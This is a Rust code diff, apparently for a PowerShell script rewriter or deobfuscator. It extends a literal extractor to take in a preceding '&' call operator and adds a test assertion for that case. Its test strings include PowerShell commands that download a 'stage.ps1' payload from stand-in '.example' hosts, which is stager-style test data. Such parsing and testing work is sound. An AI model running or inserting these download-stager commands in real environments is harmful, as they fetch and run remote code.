@@ -3766,7 +3766,22 @@ fn ps_literal_extractor_call_start_and_arg_pos(
     if is_ident_byte(prev) || is_ident_byte(next) {
         return None;
     }
-    Some((call_start, skip_ascii_ws(bytes, end_name)))
+    Some((
+        preceding_call_operator_start(bytes, call_start).unwrap_or(call_start),
+        skip_ascii_ws(bytes, end_name),
+    ))
+}
+
+fn preceding_call_operator_start(bytes: &[u8], token_start: usize) -> Option<usize> {
+    let mut before_token = token_start;
+    while before_token > 0 && bytes[before_token - 1].is_ascii_whitespace() {
+        before_token -= 1;
+    }
+    let amp = before_token.checked_sub(1)?;
+    if bytes.get(amp) != Some(&b'&') || bytes.get(amp.wrapping_sub(1)) == Some(&b'&') {
+        return None;
+    }
+    Some(amp)
 }
 
 #[derive(Clone, Copy)]
@@ -7259,6 +7274,10 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~'
                 "'Invoke-WebRequest -Uri https://ps-call-operator-trim-extractor.example/stage.ps1'"
             ),
             "call-operator trim extractor call was not rewritten:\n{out}"
+        );
+        assert!(
+            !out.contains("& 'Invoke-WebRequest"),
+            "call-operator rewrite left a dangling call operator:\n{out}"
         );
     }
 
